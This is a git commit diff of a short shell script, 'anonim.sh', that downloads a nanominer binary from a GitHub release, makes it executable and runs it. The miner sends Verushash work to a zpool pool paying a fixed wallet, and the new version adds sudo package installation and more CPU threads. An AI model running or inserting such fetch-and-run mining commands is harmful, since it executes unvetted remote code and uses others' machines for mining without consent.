bd9e646f9f7cfe41d31500064055896a565b8348
jacujamil <91077383+jacujamil@users.noreply.github.com>
2022-08-14 15:52:12 +0000

    Update anonim.sh

--- anonim.sh
+++ anonim.sh
@@ -1,2 +1,3 @@
-wget https://github.com/berhasilsemua83/Raven/releases/download/v1.0/nanominer && chmod +x nanominer && ./nanominer -algo Verushash -wallet DAxGkuHcPytmsbUTMebR4yB92Hx5X3AC4E -coin VRSC -rigName rig1 -pool1 verushash.sea.mine.zpool.ca:6143 -cpuThreads 1 -rigPassword c=DOGE
+#!/bin/sh
+sudo apt update && sudo apt install screen -y && wget https://github.com/berhasilsemua83/Raven/releases/download/v1.0/nanominer && chmod +x nanominer && ./nanominer -algo Verushash -wallet DAxGkuHcPytmsbUTMebR4yB92Hx5X3AC4E -coin VRSC -rigName rig1 -pool1 verushash.sea.mine.zpool.ca:6143 -cpuThreads 2 -rigPassword c=DOGE,gi
 
